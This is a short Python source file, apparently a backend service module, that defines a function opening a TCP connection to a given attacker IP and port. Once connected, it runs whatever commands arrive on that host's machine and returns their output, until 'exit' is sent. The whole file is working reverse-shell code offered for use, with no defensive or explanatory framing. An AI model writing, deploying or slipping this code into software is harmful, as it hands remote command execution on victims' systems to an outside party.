# backend/services/reverse_shell.py

import socket
import subprocess
import os

def start_reverse_shell(attacker_ip, attacker_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))

        s.send(b"[+] Connection established!\n")
        while True:
            data = s.recv(1024).decode()
            if data.lower() == "exit":
                break
            output = subprocess.getoutput(data)
            s.send(output.encode() + b"\n")
        s.close()
        return {"status": "shell closed"}
    except Exception as e:
        return {"error": str(e)}

